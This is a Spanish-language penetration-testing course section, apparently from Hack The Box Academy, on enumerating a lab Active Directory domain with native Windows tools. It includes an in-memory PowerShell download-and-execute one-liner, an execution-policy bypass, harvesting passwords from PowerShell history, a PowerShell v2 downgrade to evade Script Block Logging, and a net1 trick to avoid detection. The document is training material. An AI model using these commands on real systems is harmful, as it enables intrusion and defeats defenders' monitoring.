Earlier in the module, practicamos varias herramientas y técnicas (tanto con credenciales como sin credenciales) para enumerar el entorno AD. Estos métodos requerían que subiéramos o extrajéramos la herramienta al host inicial o tuviéramos un host de ataque dentro del entorno. Esta sección discutirá varias técnicas para utilizar herramientas nativas de Windows para realizar nuestra enumeración y luego practicarlas desde nuestro host de ataque en Windows.

---

## Scenario

Supongamos que nuestro cliente nos ha pedido que probemos su entorno AD desde un host gestionado sin acceso a Internet y todos los esfuerzos para cargar herramientas en él han fallado. Nuestro cliente quiere ver qué tipos de enumeración son posibles, por lo que tendremos que recurrir a "living off the land" o solo usar herramientas y comandos nativos de Windows/Active Directory. Esto también puede ser un enfoque más sigiloso y puede no crear tantas entradas de registro y alertas como la extracción de herramientas en la red en secciones anteriores. La mayoría de los entornos empresariales hoy en día tienen alguna forma de monitoreo y registro de red, incluyendo IDS/IPS, firewalls y sensores pasivos y herramientas además de sus defensas basadas en host, como Windows Defender o EDR empresarial. Dependiendo del entorno, también pueden tener herramientas que toman una línea base del tráfico "normal" de la red y buscan anomalías. Debido a esto, nuestras posibilidades de ser detectados aumentan exponencialmente cuando comenzamos a extraer herramientas al entorno desde el exterior.

---

## Env Commands For Host & Network Recon

Primero, cubriremos algunos comandos ambientales básicos que se pueden usar para darnos más información sobre el host en el que estamos.

### Basic Enumeration Commands

|**Command**|**Result**|
|---|---|
|`hostname`|Imprime el nombre de la PC|
|`[System.Environment]::OSVersion.Version`|Imprime la versión y nivel de revisión del sistema operativo|
|`wmic qfe get Caption,Description,HotFixID,InstalledOn`|Imprime los parches y hotfixes aplicados al host|
|`ipconfig /all`|Imprime el estado del adaptador de red y las configuraciones|
|`set`|Muestra una lista de variables de entorno para la sesión actual (ejecutado desde CMD-prompt)|
|`echo %USERDOMAIN%`|Muestra el nombre del dominio al que pertenece el host (ejecutado desde CMD-prompt)|
|`echo %logonserver%`|Imprime el nombre del controlador de dominio con el que el host se registra (ejecutado desde CMD-prompt)|

### Basic Enumeration

![image](https://academy.hackthebox.com/storage/modules/143/basic-enum.png)

Los comandos anteriores nos darán una imagen inicial rápida del estado en el que se encuentra el host, así como alguna información básica de red y dominio. Podemos cubrir la información anterior con un solo comando: [systeminfo](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/systeminfo).

### Systeminfo

![image](https://academy.hackthebox.com/storage/modules/143/systeminfo.png)

El comando `systeminfo`, como se ve arriba, imprimirá un resumen de la información del host para nosotros en una salida ordenada. Ejecutar un comando generará menos registros, lo que significa menos posibilidades de ser notados en el host por un defensor.

---

## Harnessing PowerShell

PowerShell ha existido desde 2006 y proporciona a los administradores de sistemas de Windows un extenso marco para administrar todos los aspectos de los sistemas Windows y los entornos AD. Es un poderoso lenguaje de scripting y se puede usar para profundizar en los sistemas. PowerShell tiene muchas funciones y módulos integrados que podemos usar en un compromiso para reconocer el host y la red y enviar y recibir archivos.

Veamos algunas de las formas en que PowerShell puede ayudarnos.

|**Cmd-Let**|**Description**|
|---|---|
|`Get-Module`|Lista los módulos disponibles cargados para su uso.|
|`Get-ExecutionPolicy -List`|Imprimirá la configuración de la [política de ejecución](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2) para cada ámbito en un host.|
|`Set-ExecutionPolicy Bypass -Scope Process`|Esto cambiará la política para nuestro proceso actual usando el parámetro `-Scope`. Hacer esto revertirá la política una vez que abandonemos el proceso o lo terminemos. Esto es ideal porque no haremos un cambio permanente en el host víctima.|
|`Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt`|Con este comando, podemos obtener el historial de PowerShell del usuario especificado. Esto puede ser bastante útil ya que el historial de comandos puede contener contraseñas o apuntarnos hacia archivos de configuración o scripts que contienen contraseñas.|
|`Get-ChildItem Env: \| ft Key,Value`|Devuelve valores de entorno como rutas clave, usuarios, información del equipo, etc.|
|`powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"`|Esta es una forma rápida y fácil de descargar un archivo de la web usando PowerShell y llamarlo desde la memoria.|

Veamoslos en acción ahora en el host `MS01`.

### Quick Checks Using PowerShell

```r
PS C:\htb> Get-Module

ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
Manifest   1.0.1.0    ActiveDirectory                     {Add-ADCentralAccessPolicyMember, Add-ADComputerServiceAcc...
Manifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}
Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PS...

PS C:\htb> Get-ExecutionPolicy -List
Get-ExecutionPolicy -List

        Scope ExecutionPolicy
        ----- ---------------
MachinePolicy       Undefined
   UserPolicy       Undefined
      Process       Undefined
  CurrentUser       Undefined
 LocalMachine    RemoteSigned


PS C:\htb> whoami
nt authority\system

PS C:\htb> Get-ChildItem Env: | ft key,value

Get-ChildItem Env: | ft key,value

Key                     Value
---                     -----
ALLUSERSPROFILE         C:\ProgramData
APPDATA                 C:\Windows\system32\config\systemprofile\AppData\Roaming
CommonProgramFiles      C:\Program Files (x86)\Common Files
CommonProgramFiles(x86) C:\Program Files (x86)\Common Files
CommonProgramW6432      C:\Program Files\Common Files
COMPUTERNAME            ACADEMY-EA-MS01
ComSpec                 C:\Windows\system32\cmd.exe
DriverData              C:\Windows\System32\Drivers\DriverData
LOCALAPPDATA            C:\Windows\system32\config\systemprofile\AppData\Local
NUMBER_OF_PROCESSORS    4
OS                      Windows_NT
Path                    C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShel...
PATHEXT                 .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
PROCESSOR_ARCHITECTURE  x86
PROCESSOR_ARCHITEW6432  AMD64
PROCESSOR_IDENTIFIER    AMD64 Family 23 Model 49 Stepping 0, AuthenticAMD
PROCESSOR_LEVEL         23
PROCESSOR_REVISION      3100
ProgramData             C:\ProgramData
ProgramFiles            C:\Program Files (x86)
ProgramFiles(x86)       C:\Program Files (x86)
ProgramW6432            C:\Program Files
PROMPT                  $P$G
PSModulePath            C:\Program Files\WindowsPowerShell\Modules;WindowsPowerShell\Modules;C:\Program Files (x86)\...
PUBLIC                  C:\Users\Public
SystemDrive             C:
SystemRoot              C:\Windows
TEMP                    C:\Windows\TEMP
TMP                     C:\Windows\TEMP
USERDOMAIN              INLANEFREIGHT
USERNAME                ACADEMY-EA-MS01$
USERPROFILE             C:\Windows\system32\config\systemprofile
windir                  C:\Windows
```

Hemos realizado la enumeración básica del host. Ahora, discutamos algunas tácticas de seguridad operativa.

Muchos defensores no son conscientes de que varias versiones de PowerShell a menudo existen en un host. Si no se desinstalan, aún se pueden usar. El registro de eventos de PowerShell se introdujo como una característica con PowerShell 3.0 en adelante. Con eso en mente, podemos intentar llamar a la versión 2.0 de PowerShell o una anterior. Si tiene éxito, nuestras acciones desde el shell no se registrarán en el Visor de Eventos. Esta es una excelente manera de permanecer bajo el radar de los defensores mientras utilizamos los recursos integrados en los hosts para nuestro beneficio. A continuación se muestra un ejemplo de cómo degradar PowerShell.

### Downgrade PowerShell

```r
PS C:\htb> Get-host

Name             : ConsoleHost
Version          : 5.1.19041.1320
InstanceId       : 18ee9fb4-ac42-4dfe-85b2-61687291bbfc
UI               : System.Management.Automation.Internal.Host.InternalHostUserInterface
CurrentCulture   : en-US
CurrentUICulture : en-US
PrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy
DebuggerEnabled  : True
IsRunspacePushed : False
Runspace         : System.Management.Automation.Runspaces.LocalRunspace

PS C:\htb> powershell.exe -version 2
Windows PowerShell
Copyright (C) 2009 Microsoft Corporation. All rights reserved.

PS C:\htb> Get-host
Name             : ConsoleHost
Version          : 2.0
InstanceId       : 121b807c-6daa-4691-85ef-998ac137e469
UI               : System.Management.Automation.Internal.Host.InternalHostUserInterface
CurrentCulture   : en-US
CurrentUICulture : en-US
PrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy
IsRunspacePushed : False
Runspace         : System.Management.Automation.Runspaces.LocalRunspace

PS C:\htb> get-module

ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
Script     0.0        chocolateyProfile                   {TabExpansion, Update-SessionEnvironment, refreshenv}
Manifest   3.1.0.0    Microsoft.PowerShell.Management     {Add-Computer, Add-Content, Checkpoint-Computer, Clear-Content...}
Manifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}
Script     0.7.3.1    posh-git                            {Add-PoshGitToProfile, Add-SshKey, Enable-GitColors, Expand-GitCommand...}
Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PSReadLineKeyHandler...
```

Ahora podemos ver que estamos ejecutando una versión anterior de PowerShell a partir de la salida anterior. Observe la diferencia en la versión informada. Valida que hemos degradado con éxito el shell. Verifiquemos y veamos si todavía estamos escribiendo registros. El lugar principal para buscar es en el `PowerShell Operational Log` que se encuentra en `Applications and Services Logs > Microsoft > Windows > PowerShell > Operational`. Todos los comandos ejecutados en nuestra sesión se registrarán en este archivo. El `Windows PowerShell` log ubicado en `Applications and Services Logs > Windows PowerShell` también es un buen lugar para verificar. Se hará una entrada aquí cuando iniciemos una instancia de PowerShell. En la imagen a continuación, podemos ver las entradas rojas hechas en el registro de la sesión actual de PowerShell y la salida de la última entrada hecha a las 2:12 pm cuando se realiza la degradación. Fue la última entrada ya que nuestra sesión se movió a una versión de PowerShell que ya no era capaz de registrar. Observe que ese evento corresponde con el último evento en las entradas del registro `Windows PowerShell`.

### Examining the Powershell Event Log

![text](https://academy.hackthebox.com/storage/modules/143/downgrade.png)

Con [Script Block Logging](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.2) habilitado, podemos ver que cualquier cosa que escribamos en la terminal se envía a este registro. Si degradamos a PowerShell V2, esto ya no funcionará correctamente. Nuestras acciones posteriores estarán enmascaradas ya que Script Block Logging no funciona por debajo de PowerShell 3.0. Observe en los registros anteriores que podemos ver los comandos que emitimos durante una sesión de shell normal, pero se detuvo después de iniciar una nueva instancia de PowerShell en la versión 2. Tenga en cuenta que la acción de emitir el comando `powershell.exe -version 2` dentro de la sesión de PowerShell se registrará. Por lo tanto, se dejará evidencia de que la degradación ocurrió, y un defensor sospechoso o vigilante puede comenzar una investigación después de ver esto y que los registros ya no se llenen para esa instancia. Podemos ver un ejemplo de esto en la imagen a continuación. Los elementos en el cuadro rojo son las entradas del registro antes de iniciar la nueva instancia, y la información en verde es el texto que muestra que se inició una nueva sesión de PowerShell en HostVersion 2.0.

### Starting V2 Logs

![text](https://academy.hackthebox.com/storage/modules/143/start-event.png)

---

### Checking Defenses

Los siguientes comandos utilizan las utilidades [netsh](https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts) y [sc](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-query) para ayudarnos a comprender el estado del host en lo que respecta a la configuración del Firewall de Windows y para verificar el estado de Windows Defender.

### Firewall Checks

```r
PS C:\htb> netsh advfirewall show allprofiles

Domain Profile Settings:
----------------------------------------------------------------------
State                                 OFF
Firewall Policy                       BlockInbound,AllowOutbound
LocalFirewallRules                    N/A (GPO-store only)
LocalConSecRules                      N/A (GPO-store only)
InboundUserNotification               Disable
RemoteManagement                      Disable
UnicastResponseToMulticast            Enable

Logging:
LogAllowedConnections                 Disable
LogDroppedConnections                 Disable
FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
MaxFileSize                           4096

Private Profile Settings:
----------------------------------------------------------------------
State                                 OFF
Firewall Policy                       BlockInbound,AllowOutbound
LocalFirewallRules                    N/A (GPO-store only)
LocalConSecRules                      N/A (GPO-store only)
InboundUserNotification               Disable
RemoteManagement                      Disable
UnicastResponseToMulticast            Enable

Logging:
LogAllowedConnections                 Disable
LogDroppedConnections                 Disable
FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
MaxFileSize                           4096

Public Profile Settings:
----------------------------------------------------------------------
State                                 OFF
Firewall Policy                       BlockInbound,AllowOutbound
LocalFirewallRules                    N/A (GPO-store only)
LocalConSecRules                      N/A (GPO-store only)
InboundUserNotification               Disable
RemoteManagement                      Disable
UnicastResponseToMulticast            Enable

Logging:
LogAllowedConnections                 Disable
LogDroppedConnections                 Disable
FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
MaxFileSize                           4096
```

### Windows Defender Check (from CMD.exe)

```r
C:\htb> sc query windefend

SERVICE_NAME: windefend
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

Arriba, verificamos si

 Defender estaba en funcionamiento. A continuación, verificaremos el estado y la configuración con el cmdlet [Get-MpComputerStatus](https://docs.microsoft.com/en-us/powershell/module/defender/get-mpcomputerstatus?view=windowsserver2022-ps) en PowerShell.

### Get-MpComputerStatus

```r
PS C:\htb> Get-MpComputerStatus

AMEngineVersion                  : 1.1.19000.8
AMProductVersion                 : 4.18.2202.4
AMRunningMode                    : Normal
AMServiceEnabled                 : True
AMServiceVersion                 : 4.18.2202.4
AntispywareEnabled               : True
AntispywareSignatureAge          : 0
AntispywareSignatureLastUpdated  : 3/21/2022 4:06:15 AM
AntispywareSignatureVersion      : 1.361.414.0
AntivirusEnabled                 : True
AntivirusSignatureAge            : 0
AntivirusSignatureLastUpdated    : 3/21/2022 4:06:16 AM
AntivirusSignatureVersion        : 1.361.414.0
BehaviorMonitorEnabled           : True
ComputerID                       : FDA97E38-1666-4534-98D4-943A9A871482
ComputerState                    : 0
DefenderSignaturesOutOfDate      : False
DeviceControlDefaultEnforcement  : Unknown
DeviceControlPoliciesLastUpdated : 3/20/2022 9:08:34 PM
DeviceControlState               : Disabled
FullScanAge                      : 4294967295
FullScanEndTime                  :
FullScanOverdue                  : False
FullScanRequired                 : False
FullScanSignatureVersion         :
FullScanStartTime                :
IoavProtectionEnabled            : True
IsTamperProtected                : True
IsVirtualMachine                 : False
LastFullScanSource               : 0
LastQuickScanSource              : 2

<SNIP>
```

Saber qué revisión tienen nuestras configuraciones de AV y qué configuraciones están habilitadas/deshabilitadas puede beneficiarnos enormemente. Podemos saber con qué frecuencia se ejecutan los análisis, si la alerta de amenaza bajo demanda está activa y más. Esta también es una gran información para reportar. A menudo, los defensores pueden pensar que ciertas configuraciones están habilitadas o que los análisis están programados para ejecutarse en ciertos intervalos. Si ese no es el caso, estos hallazgos pueden ayudarles a remediar esos problemas.

---

## Am I Alone?

Cuando aterrizamos en un host por primera vez, una cosa importante es verificar y ver si somos los únicos conectados. Si comenzamos a tomar acciones desde un host en el que alguien más está, existe la posibilidad de que nos noten. Si se lanza una ventana emergente o un usuario cierra su sesión, pueden reportar estas acciones o cambiar su contraseña, y podríamos perder nuestro punto de apoyo.

### Using qwinsta

```r
PS C:\htb> qwinsta

 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
 services                                    0  Disc
>console           forend                    1  Active
 rdp-tcp                                 65536  Listen
```

Ahora que tenemos una idea sólida del estado de nuestro host, podemos enumerar la configuración de red de nuestro host e identificar cualquier máquina o servicio de dominio potencial que podamos querer apuntar a continuación.

## Network Information

|**Networking Commands**|**Description**|
|---|---|
|`arp -a`|Lista todos los hosts conocidos almacenados en la tabla arp.|
|`ipconfig /all`|Imprime la configuración del adaptador para el host. Podemos averiguar el segmento de red desde aquí.|
|`route print`|Muestra la tabla de enrutamiento (IPv4 & IPv6) identificando redes conocidas y rutas de capa tres compartidas con el host.|
|`netsh advfirewall show state`|Muestra el estado del firewall del host. Podemos determinar si está activo y filtrando tráfico.|

Comandos como `ipconfig /all` y `systeminfo` nos muestran algunas configuraciones básicas de red. Dos comandos más importantes nos proporcionan una gran cantidad de datos valiosos y podrían ayudarnos a avanzar en nuestro acceso. `arp -a` y `route print` nos mostrarán qué hosts conoce la caja en la que estamos y qué redes conoce el host. Cualquier red que aparezca en la tabla de enrutamiento son posibles avenidas para movimiento lateral porque se accede a ellas lo suficiente como para que se haya agregado una ruta, o se ha establecido administrativamente allí para que el host sepa cómo acceder a recursos en el dominio. Estos dos comandos pueden ser especialmente útiles en la fase de descubrimiento de una evaluación black box donde tenemos que limitar nuestro escaneo.

### Using arp -a

```r
PS C:\htb> arp -a

Interface: 172.16.5.25 --- 0x8
  Internet Address      Physical Address      Type
  172.16.5.5            00-50-56-b9-08-26     dynamic
  172.16.5.130          00-50-56-b9-f0-e1     dynamic
  172.16.5.240          00-50-56-b9-9d-66     dynamic
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  224.0.0.252           01-00-5e-00-00-fc     static
  239.255.255.250       01-00-5e-7f-ff-fa     static

Interface: 10.129.201.234 --- 0xc
  Internet Address      Physical Address      Type
  10.129.0.1            00-50-56-b9-b9-fc     dynamic
  10.129.202.29         00-50-56-b9-26-8d     dynamic
  10.129.255.255        ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  224.0.0.252           01-00-5e-00-00-fc     static
  239.255.255.250       01-00-5e-7f-ff-fa     static
  255.255.255.255       ff-ff-ff-ff-ff-ff     static
```

### Viewing the Routing Table

```r
PS C:\htb> route print

===========================================================================
Interface List
  8...00 50 56 b9 9d d9 ......vmxnet3 Ethernet Adapter #2
 12...00 50 56 b9 de 92 ......vmxnet3 Ethernet Adapter
  1...........................Software Loopback Interface 1
===========================================================================

IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0       172.16.5.1      172.16.5.25    261
          0.0.0.0          0.0.0.0       10.129.0.1   10.129.201.234     20
       10.129.0.0      255.255.0.0         On-link    10.129.201.234    266
   10.129.201.234  255.255.255.255         On-link    10.129.201.234    266
   10.129.255.255  255.255.255.255         On-link    10.129.201.234    266
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
       172.16.4.0    255.255.254.0         On-link       172.16.5.25    261
      172.16.5.25  255.255.255.255         On-link       172.16.5.25    261
     172.16.5.255  255.255.255.255         On-link       172.16.5.25    261
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
        224.0.0.0        240.0.0.0         On-link    10.129.201.234    266
        224.0.0.0        240.0.0.0         On-link       172.16.5.25    261
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
  255.255.255.255  255.255.255.255         On-link    10.129.201.234    266
  255.255.255.255  255.255.255.255         On-link       172.16.5.25    261
  ===========================================================================
Persistent Routes:
  Network Address          Netmask  Gateway Address  Metric
          0.0.0.0          0.0.0.0       172.16.5.1  Default
===========================================================================

IPv6 Route Table
===========================================================================

<SNIP>
```

Usar `arp -a` y `route print` no solo beneficiará en la enumeración de entornos AD, sino que también nos ayudará a identificar oportunidades para pivotar a diferentes segmentos de red en cualquier entorno. Estos son comandos que deberíamos considerar usar en cada compromiso para ayudar a nuestros clientes a comprender a dónde puede intentar ir un atacante después de la penetración inicial.

---

## Windows Management Instrumentation (WMI)

[Windows Management Instrumentation (WMI)](https://docs.microsoft.com/en-us/windows/win32/wmisdk/about-wmi) es un motor de scripting que se usa ampliamente dentro de los entornos empresariales de Windows para recuperar información y ejecutar tareas administrativas en hosts locales y remotos. Para nuestro uso, crearemos un informe WMI sobre usuarios de dominio, grupos, procesos y otra información de nuestro host y otros hosts de dominio.

### Quick WMI checks

|**Command**|**Description**|
|---|---|
|`wmic qfe get Caption,Description,HotFixID,InstalledOn`|Imprime el nivel de parche y descripción de los hotfixes aplicados|
|`wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List`|Muestra información básica del host, incluyendo cualquier atributo dentro de la lista|
|`wmic process list /format:list`|Un listado de todos los procesos en el host|
|`wmic ntdomain list /format:list`|Muestra información sobre el Dominio y los Controladores de Dominio|
|`wmic useraccount list /format:list`|Muestra información sobre todas las cuentas locales y cualquier cuenta de dominio que haya iniciado sesión en el dispositivo|
|`wmic group list /format:list`|Información sobre todos los grupos locales|
|`wmic sysaccount list /format:list`|Muestra información sobre cualquier cuenta del sistema que se esté utilizando como cuentas de servicio.|

A continuación, podemos ver información sobre el dominio y el dominio hijo, y el bosque externo con el que nuestro dominio actual tiene una confianza. Este [cheatsheet](https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4) tiene algunos comandos útiles para consultar información del host y del dominio usando wmic.

```r
PS C:\htb> wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress

Caption          Description      DnsForestName           DomainControllerAddress  DomainName
ACADEMY-EA-MS01  ACADEMY-EA-MS01
INLANEFREIGHT    INLANEFREIGHT    INLANEFREIGHT.LOCAL     \\172.16.5.5             INLANEFREIGHT
LOGISTICS        LOGISTICS        INLANEFREIGHT.LOCAL     \\172.16.5.240           LOGISTICS
FREIGHTLOGISTIC  FREIGHTLOGISTIC  FREIGHTLOGISTICS.LOCAL  \\172.16.5.238           FREIGHTLOGISTIC
```

WMI es un tema vasto, y sería imposible tocar todo lo que es capaz de hacer en una parte de una sección. Para más información sobre WMI y sus capacidades, consulte la documentación oficial de [WMI](https://docs.microsoft.com/en-us/windows/win32/wmisdk/using-wmi).

---

## Net Commands

Los [Net](https://docs.microsoft.com/en-us/windows/win32/winsock/net-exe-2) comandos pueden ser beneficiosos para nosotros al intentar enumerar información del dominio. Estos comandos se pueden utilizar para consultar el host local y los hosts remotos, al igual que las capacidades proporcionadas por WMI. Podemos listar información como:

- Usuarios locales y de dominio
- Grupos
- Hosts
- Usuarios específicos en grupos
- Controladores de dominio
- Requisitos de contraseña

Cubriremos algunos ejemplos a continuación. Tenga en cuenta que los comandos `net.exe` son típicamente monitoreados por soluciones EDR y pueden revelar rápidamente nuestra ubicación si nuestra evaluación tiene un componente evasivo. Algunas organizaciones incluso configurarán sus herramientas de monitoreo para lanzar alertas si ciertos comandos son ejecutados por usuarios en OUs específicos, como la cuenta de un Asociado de Marketing ejecutando comandos como `whoami`, y `net localgroup administrators`, etc. Esto podría ser una señal de alerta obvia para cualquiera que esté monitoreando la red intensamente.

### Table of Useful Net Commands

|**Command**|**Description**|
|---|---|
|`net accounts`|Información sobre los requisitos de contraseña|
|`net accounts /domain`|Política de contraseña y bloqueo|
|`net group /domain`|Información sobre grupos de dominio|
|`net group "Domain Admins" /domain`|Lista de usuarios con privilegios de administrador de dominio|
|`net group "domain computers" /domain`|Lista de PCs conectados al dominio|
|`net group "Domain Controllers" /domain`|Lista de cuentas de PC de los controladores de dominio|
|`net group <domain_group_name> /domain`|Usuarios que pertenecen al grupo|
|`net groups /domain`|Lista de grupos de dominio|
|`net localgroup`|Todos los grupos disponibles|
|`net localgroup administrators /domain`|Lista de usuarios que pertenecen al grupo de administradores dentro del dominio (el grupo `Domain Admins` está incluido aquí por defecto)|
|`net localgroup Administrators`|Información sobre un grupo (administradores)|
|`net localgroup administrators [username] /add`|Agregar usuario a administradores|
|`net share`|Verificar las comparticiones actuales|
|`net user <ACCOUNT_NAME> /domain`|Obtener información sobre un usuario dentro del dominio|
|`net user /domain`|Lista de todos los usuarios del dominio|
|`net user %username%`|Información sobre el usuario actual|
|`net use x: \computer\share`|Montar la compartición localmente|
|`net view`|Obtener una lista de computadoras|
|`net view /all /domain[:domainname]`|Comparticiones en los dominios|
|`net view \computer /ALL`|Lista de comparticiones de una computadora|
|`net view /domain`|Lista de PCs del dominio|

### Listing Domain Groups

```r
PS C:\htb> net group /domain

The request will be processed at a domain controller for domain INLANEFREIGHT.LOCAL.

Group Accounts for \\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
-------------------------------------------------------------------------------
*$H25000-1RTRKC5S507F
*Accounting
*Barracuda_all_access
*Barracuda_facebook_access
*Barracuda_parked_sites
*Barracuda_youtube_exempt
*Billing
*Billing_users
*Calendar Access
*CEO
*CFO
*Cloneable Domain Controllers
*Collaboration_users
*Communications_users
*Compliance Management
*Computer Group Management
*Contractors
*CTO

<SNIP>
```

Podemos ver arriba que el comando `net group` nos proporcionó una lista de grupos dentro del dominio.

### Information about a Domain User

```r
PS C:\htb> net user /domain wrouse

The request will be processed at a domain controller for domain INLANEFREIGHT.LOCAL.

User name                    wrouse
Full Name                    Christopher Davis
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/27/2021 10:38:01 AM
Password expires             Never
Password changeable          10/28/2021 10:38:01 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *File Share G Drive   *File Share H Drive
                             *Warehouse            *Printer Access
                             *Domain Users         *VPN Users
                             *Shared Calendar Read
The command completed successfully.
```

### Net Commands Trick

Si crees que los defensores de la red están registrando/observando activamente cualquier comando fuera de lo normal, puedes intentar este truco para usar comandos net. Escribir `net1` en lugar de `net` ejecutará las mismas funciones sin el posible desencadenante del string net.

### Running Net1 Command

![image](https://academy.hackthebox.com/storage/modules/143/net1userreal.png)

---

## Dsquery

[Dsquery](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952(v=ws.11)) es una herramienta de línea de comandos útil que se puede utilizar para encontrar objetos en Active Directory.

 Las consultas que ejecutamos con esta herramienta se pueden replicar fácilmente con herramientas como BloodHound y PowerView, pero es posible que no siempre tengamos esas herramientas a nuestra disposición, como se discutió al principio de la sección. Pero, es una herramienta probable que los administradores de sistemas de dominio estén utilizando en su entorno. Con esto en mente, `dsquery` existirá en cualquier host con el `Active Directory Domain Services Role` instalado, y el DLL `dsquery` existe en todos los sistemas Windows modernos por defecto ahora y se puede encontrar en `C:\Windows\System32\dsquery.dll`.

### Dsquery DLL

Todo lo que necesitamos son privilegios elevados en un host o la capacidad de ejecutar una instancia de Command Prompt o PowerShell desde un contexto `SYSTEM`. A continuación, mostraremos la función de búsqueda básica con `dsquery` y algunos filtros de búsqueda útiles.

### User Search

```r
PS C:\htb> dsquery user

"CN=Administrator,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Guest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=lab_adm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=krbtgt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Htb Student,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Annie Vazquez,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Paul Falcon,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Fae Anthony,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Walter Dillard,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Louis Bradford,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Sonya Gage,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Alba Sanchez,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Daniel Branch,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Christopher Cruz,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Nicole Johnson,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Mary Holliday,OU=Human Resources,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Michael Shoemaker,OU=Human Resources,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Arlene Slater,OU=Human Resources,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Kelsey Prentiss,OU=Human Resources,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
```

### Computer Search

```r
PS C:\htb> dsquery computer

"CN=ACADEMY-EA-DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL"
"CN=ACADEMY-EA-MS01,OU=Web Servers,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=ACADEMY-EA-MX01,OU=Mail,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=SQL01,OU=SQL Servers,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=ILF-XRG,OU=Critical,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=MAINLON,OU=Critical,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
